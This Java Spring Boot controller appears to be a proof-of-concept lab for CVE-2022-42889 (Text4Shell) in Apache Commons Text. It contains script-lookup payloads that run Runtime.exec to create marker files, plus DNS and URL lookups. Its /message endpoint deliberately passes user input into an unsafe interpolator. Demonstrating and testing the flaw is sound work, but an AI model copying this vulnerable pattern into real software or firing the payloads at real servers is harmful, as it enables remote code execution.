package com.example.springboot;

import org.apache.commons.text.StringSubstitutor;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class TextController {
    @GetMapping("/poc1")
    public String pocScript() {
        String script;
        if (getRunningJVMVersion() < 15) {
            script = "${java:version} - ${script:javascript:7*7} - ${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}";
        } else {
            script = "${java:version} - ${script:JEXL:7*7} - ${script:JEXL:''.getClass().forName('java.lang.Runtime').getRuntime().exec('touch /tmp/pwned')}";
        }
        return interpolate(script);
    }

    @GetMapping("/poc2")
    public String pocDNS() {
        String dns = "${java:version} - ${dns:address|commons.apache.org}";
        return interpolate(dns);
    }

    @GetMapping("/poc3")
    public String pocURL() {
        String dns = "${java:version} - ${url:UTF-8:https://nvd.nist.gov/vuln/detail/CVE-2022-42889}";
        return interpolate(dns);
    }

    @GetMapping("/message")
    public String handleScript(@RequestParam(defaultValue = "You are running java.version ${java.version} and os.name = ${os.name}") String text) {
        return interpolate(text);
    }

    private int getRunningJVMVersion() {
        System.out.println("Current JVM version - " + System.getProperty("java.version"));

        String[] versionElements = System.getProperty("java.version").split("\\.");
        int discard = Integer.parseInt(versionElements[0]);
        int version = (discard == 1) ? Integer.parseInt(versionElements[1]) : discard;
        return version;
    }

    private String interpolate(String input) {
        final StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        String out = interpolator.replace(input);
        System.out.println(out);
        return out;
    }
}
